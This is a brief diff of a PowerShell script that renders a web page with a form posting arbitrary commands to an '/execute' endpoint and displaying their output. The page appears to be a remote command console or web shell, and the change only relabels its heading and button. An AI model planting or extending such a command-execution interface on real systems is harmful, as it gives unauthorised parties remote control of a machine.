@@ -136,9 +136,9 @@ Function DisplayWebpage {
         }}
     $html += "</tbody></table>"
     $html += "</ul>"
-    $html += "<h3>PowerShell</h3>"
+    $html += "<h3>Command Input</h3>"
     $html += "<form method='post' action='/execute'>"
-    $html += "<span><textarea name='command' rows='1' cols='80'></textarea><input type='submit' value='Run'></span><br>"
+    $html += "<span><textarea name='command' rows='1' cols='80'></textarea><input type='submit' value='Execute'></span><br>"
     $html += "</form>"
     $html += "<h3>Output</h3><pre name='output' rows='10' cols='80'>$output</pre></body></html>"
     $html += "</body></html>"
